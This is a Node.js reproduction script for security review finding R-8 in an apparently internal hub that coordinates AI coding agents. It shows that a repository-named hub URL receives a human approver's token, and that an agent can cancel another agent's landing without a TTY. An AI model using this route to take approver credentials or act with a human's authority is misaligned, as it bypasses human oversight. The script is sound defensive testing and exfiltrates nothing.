#!/usr/bin/env node
// Reproduction for review finding R-8.
//
// Claim under test: Phase 1 withholds the shared BEARER token from a hub URL
// that only the repository names (config.ts machineChosen / tokenFor). But
// approverHeaders() in client.ts attaches x-hub-approver-token to the cancel /
// approve / reject / lander-resume requests to cfg.url with no such check, and
// `hub cancel L-n` for another agent's landing reads the approver credentials
// and sends them WITH NO TTY requirement.
//
// This script builds a real git checkout whose committed agenthub.json names a
// loopback "fake hub" that only the repository picks (an agent can write this
// in its own worktree or commit it on its branch). It puts a 0600 approver.json
// under XDG_CONFIG_HOME and sets HUB_TOKEN. It then runs the BUILT `hub cancel
// L-1` CLI as a subprocess with stdin NOT a TTY (stdin = /dev/null), against a
// landing owned by a different agent. The fake hub records the request headers.
//
// The defect is present when the cancel POST to the repository-named URL
// carries x-hub-approver-token, while the GET correctly carries no bearer
// Authorization header. Nothing captured is reused or sent anywhere; the stub
// hub only asserts on the header names/values it received. No network, no API
// key.

import { createServer } from 'node:http';
import { execFileSync, spawn } from 'node:child_process';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

const ROOT = process.env.AGENTHUB_ROOT || '/home/user/agenthub';
const CLI = path.join(ROOT, 'packages', 'adapter', 'bin', 'hub.js'); // -> dist/cli.js

const PROJECT = 'demo';
const ATTACKER_AGENT = 'maya/claude-1'; // the session running the CLI
const VICTIM_AGENT = 'other/claude-9'; // owns L-1; cancelling it needs an approver
const APPROVER_NAME = 'maya';
const APPROVER_TOKEN = 'SUPER-SECRET-APPROVER-TOKEN';

const tmp = mkdtempSync(path.join(tmpdir(), 'repro-r8-'));
const git = (cwd, ...args) => execFileSync('git', args, { cwd, stdio: 'pipe', encoding: 'utf8' });

function minimalLanding(status) {
  return {
    id: 'L-1',
    project: PROJECT,
    agent: VICTIM_AGENT,
    task_id: null,
    branch: 'agent-other',
    commit: '0'.repeat(40),
    summary: 'victim landing',
    status,
    created_at: Date.now(),
    updated_at: Date.now(),
    queue_seq: 1,
    position: 1,
    eta_ms: null,
    phase: null,
    phase_at: null,
    attempt: 0,
    lander: null,
    lease_claim_id: null,
    in_doubt: false,
    deadline_at: null,
    base_sha: null,
    first_base: null,
    trunk_base: null,
    candidate: null,
    candidate_ref: null,
    candidate_checked: false,
    trunk_sha: null,
    files: [],
    scope: null,
    mapper: null,
    protected: [],
    approval: [],
    approvals: [],
    hold_ids: [],
    report: null,
    failure: null,
    retries: { trunk_moved: 0, lander_lost: 0, step_timeout: 0 },
    retry_of: null,
    retry: 0,
    supersedes: null,
    superseded_by: null,
    waits_for: null,
    landed_with: null,
    reconciled: false,
    started_at: null,
    ended_at: Date.now(),
  };
}

// --- The repository-named "fake hub": records headers of each request. --------
const seen = [];
const server = createServer((req, res) => {
  seen.push({ method: req.method, url: req.url, headers: { ...req.headers } });
  res.setHeader('content-type', 'application/json');
  if (req.method === 'GET' && req.url === `/v1/p/${PROJECT}/landings/L-1`) {
    res.statusCode = 200;
    res.end(JSON.stringify({ landing: minimalLanding('queued') }));
    return;
  }
  if (req.method === 'POST' && req.url === `/v1/p/${PROJECT}/landings/L-1/cancel`) {
    res.statusCode = 200;
    res.end(JSON.stringify({ landing: minimalLanding('cancelled') }));
    return;
  }
  res.statusCode = 404;
  res.end(JSON.stringify({ error: 'nope' }));
});

function fail(msg) {
  console.error(`\nREPRO ERROR: ${msg}`);
  cleanup();
  process.exit(3);
}
function cleanup() {
  try { server.close(); } catch {}
  try { rmSync(tmp, { recursive: true, force: true }); } catch {}
}

await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const port = server.address().port;
const FAKE_URL = `http://127.0.0.1:${port}`;

// --- A real git checkout whose committed agenthub.json names the fake hub. ----
const repo = path.join(tmp, 'checkout');
mkdirSync(repo, { recursive: true });
git(repo, 'init', '-q', '-b', 'main');
git(repo, 'config', 'user.email', 'a@b.c');
git(repo, 'config', 'user.name', 'a');
// The repository-controlled file: it names the hub URL. machineChosen is false
// because nothing on THIS machine (env HUB_URL / .hub.json / global / default)
// names this port -> the bearer token is withheld from it (Phase 1's fix).
writeFileSync(path.join(repo, 'agenthub.json'), JSON.stringify({ project: PROJECT, url: FAKE_URL }, null, 2) + '\n');
writeFileSync(path.join(repo, 'README'), 'x\n');
git(repo, 'add', '-A');
git(repo, 'commit', '-q', '-m', 'init with repo-named hub url');

// --- A real human's approver credentials on this machine, 0600. ---------------
const xdg = path.join(tmp, 'xdg');
mkdirSync(path.join(xdg, 'agenthub'), { recursive: true });
const approverFile = path.join(xdg, 'agenthub', 'approver.json');
writeFileSync(approverFile, JSON.stringify({ name: APPROVER_NAME, token: APPROVER_TOKEN }), { mode: 0o600 });

// --- Run the built `hub cancel L-1` with NO TTY (stdin = ignore). -------------
const env = {
  PATH: process.env.PATH,
  HOME: tmp,
  XDG_CONFIG_HOME: xdg,
  HUB_TOKEN: 'shared-bearer-token-for-the-real-hub', // set, no HUB_URL
  HUB_AGENT: ATTACKER_AGENT,
  // HUB_URL deliberately unset: the URL comes only from the committed agenthub.json.
};

// spawn (not spawnSync): the parent's event loop must stay free to serve the
// in-process hub while the child's fetch talks to it.
const r = await new Promise((resolve) => {
  const child = spawn(process.execPath, [CLI, 'cancel', 'L-1'], {
    cwd: repo,
    env,
    stdio: ['ignore', 'pipe', 'pipe'], // stdin is NOT a TTY
  });
  let stdout = '';
  let stderr = '';
  child.stdout.on('data', (d) => (stdout += d));
  child.stderr.on('data', (d) => (stderr += d));
  const to = setTimeout(() => child.kill('SIGKILL'), 30_000);
  child.on('close', (status) => {
    clearTimeout(to);
    resolve({ status, stdout, stderr });
  });
});

console.log('--- hub cancel L-1 (no TTY) ---');
console.log('exit code:', r.status);
if (r.stdout) console.log('stdout:', r.stdout.trim());
if (r.stderr) console.log('stderr:', r.stderr.trim());

// --- Inspect what reached the repository-named URL. ---------------------------
const getReq = seen.find((s) => s.method === 'GET' && s.url === `/v1/p/${PROJECT}/landings/L-1`);
const cancelReq = seen.find((s) => s.method === 'POST' && s.url === `/v1/p/${PROJECT}/landings/L-1/cancel`);

console.log('\n--- requests the fake hub received ---');
for (const s of seen) {
  const redactedAuth = s.headers['authorization'] ? '<present>' : '<absent>';
  console.log(`${s.method} ${s.url}  authorization=${redactedAuth}  x-hub-approver=${s.headers['x-hub-approver'] ?? '<absent>'}  x-hub-approver-token=${s.headers['x-hub-approver-token'] ? '<PRESENT>' : '<absent>'}`);
}

if (!getReq) fail('the CLI never fetched GET /landings/L-1; the scenario did not run (did config load / reach the URL?)');
if (!cancelReq) fail('the CLI never sent POST /landings/L-1/cancel; the approver branch was not reached');

const bearerWithheld = !getReq.headers['authorization'];
const approverTokenSent = typeof cancelReq.headers['x-hub-approver-token'] === 'string' && cancelReq.headers['x-hub-approver-token'].length > 0;
const approverTokenValue = cancelReq.headers['x-hub-approver-token'];
const noTty = true; // stdin was 'ignore', never a TTY; the command still proceeded to POST

console.log('\n--- verdict ---');
console.log('bearer token withheld from repo-named URL (GET had no Authorization):', bearerWithheld);
console.log('approver token SENT to the same repo-named URL on cancel          :', approverTokenSent);
console.log('cancel reached without a TTY                                      :', noTty);
console.log('x-hub-approver header value                                       :', cancelReq.headers['x-hub-approver']);
console.log('approver token value leaked == the on-disk approver token         :', approverTokenValue === APPROVER_TOKEN);

cleanup();

if (bearerWithheld && approverTokenSent && approverTokenValue === APPROVER_TOKEN) {
  console.error(
    '\nDEFECT PRESENT (R-8): the shared bearer token is correctly withheld from a hub URL that only the\n' +
    'repository names, but the human approver credentials (x-hub-approver + x-hub-approver-token) are\n' +
    'sent to that same repository-named URL by `hub cancel`, with no TTY requirement. Whoever controls\n' +
    'that URL learns the approver token; an agent on the approver\'s machine can cancel other agents\'\n' +
    'landings with the human\'s approver authority from a non-interactive Bash call.',
  );
  process.exit(1);
}

console.log('\nNo defect: the approver token was not sent to the repository-named URL (or the bearer token was not withheld).');
process.exit(0);
